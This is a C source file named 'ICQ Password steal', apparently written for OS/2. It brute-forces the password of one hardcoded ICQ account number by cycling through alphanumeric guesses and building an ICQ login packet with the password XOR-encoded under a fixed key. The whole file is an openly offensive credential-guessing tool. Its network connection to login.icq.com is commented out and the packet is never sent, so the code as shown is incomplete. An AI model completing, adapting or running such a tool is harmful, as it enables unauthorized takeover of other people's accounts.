/*
 * ICQSTEAL.C - ICQ Password steal
 */


#ifdef __OS2__
 #pragma strings(readonly)
 #define INCL_ERRORS
 #define INCL_DOSQUEUES
 #define INCL_DOSPROCESS
 #include <os2.h>
#endif

 #include <types.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>

 #include <icqnetw.h>
 #include <pwMacros.h>

/*---[ Structures ]----------------------------------------------------------------------------------------*/

 #pragma pack(1)

 typedef struct packet
 {
    USHORT used;
    UCHAR  data[0x0100];
 } PACKET;

/*---[ Public ]--------------------------------------------------------------------------------------------*/

 static char  pwd[9] = "0";
 static int   sock   = -1;
 static ULONG uin    = 350850;

/*---[ Prototipes ]----------------------------------------------------------------------------------------*/

 static void nextPassword(void);
 static void sendLogin(void);


/*---[ Constants ]-----------------------------------------------------------------------------------------*/


/*---[ Implementing ]--------------------------------------------------------------------------------------*/

 int main(int numpar, char *param[])
 {
    while(TRUE)
    {
       printf("Trying \"%s\"...              \r",pwd);
       fflush(stdout);

       sendLogin();
       nextPassword();
       DosSleep(10);

/*
       sock = icqConnectHost("login.icq.com", 5190);

       if(sock > 0)
       {
          printf("Trying \"%s\" (Connected)...              \r",pwd);
          fflush(stdout);




          printf("Trying \"%s\" (Failed)...                 \r",pwd);
          fflush(stdout);

          icqCloseSocket(sock);
          sock = -1;
          nextPassword();
       }
       DosSleep(30000);
*/

    }


    return 0;

 }

 static void nextPassword(void)
 {
    int pos = 0;

    while(pos < 8)
    {
       switch(pwd[pos])
       {
       case '9':
          pwd[pos] = 'A';
          break;

       case 'Z':
          pwd[pos] = 'a';
          break;

       default:
          pwd[pos] = pwd[pos]+1;
       }

       if(pwd[pos] <= 'z')
          return;

       pwd[pos] = '0';
       pos++;

       if(!pwd[pos])
       {
          pwd[pos] = '0';
          return;
       }

    }

 }

 void insertLong(PACKET *pkt, USHORT tlv, ULONG vlr)
 {
    unsigned char *ptr = pkt->data + pkt->used;

    if(tlv)
    {
       *( (USHORT *) ptr ) = htons(tlv);
       ptr       += 2;
       *( (USHORT *) ptr ) = 0x0400;
       ptr       += 2;
       pkt->used += 4;
    }

    *( (ULONG *) ptr ) = htonl(vlr);
    pkt->used += sizeof(ULONG);

 }

 void insertBlock(PACKET *pkt, USHORT tlv, USHORT sz, const unsigned char *string)
 {
    unsigned char *ptr = pkt->data + pkt->used;

    if(tlv)
    {
       *( (USHORT *) ptr ) = htons(tlv);
       ptr       += 2;
       *( (USHORT *) ptr ) = 0x0400;
       ptr       += 2;
       pkt->used += 4;
    }

    while(sz--)
    {
       pkt->used++;
       *(ptr++) = *(string++);
    }


 }

 static void sendLogin(void)
 {
    static const UCHAR pwdKey[] =       { 0xF3, 0x26, 0x81, 0xC4, 0x39, 0x86,
                                          0xDB, 0x92, 0x71, 0xA3, 0xB9, 0xE6,
                                          0x53, 0x7A, 0x95, 0x7C
                                        };

    PACKET login;
    UCHAR  buffer[0x0100];
    int    f,p;

    memset(&login,0,sizeof(PACKET));

    insertLong(&login, 0, 1);

    sprintf(buffer,"%ld",uin);
    insertBlock(&login,1,strlen(buffer),buffer);

    strcpy(buffer,pwd);
    p = strlen(buffer);

    for(f=0;f<p;f++)
       buffer[f] ^= pwdKey[f];

    insertBlock(&login, 2, p, buffer);

    strcpy(buffer,"ICQ Inc. - Product of ICQ (TM).2001b.5.15.1.3638");
    insertBlock(&login,3,strlen(buffer),buffer);

 }

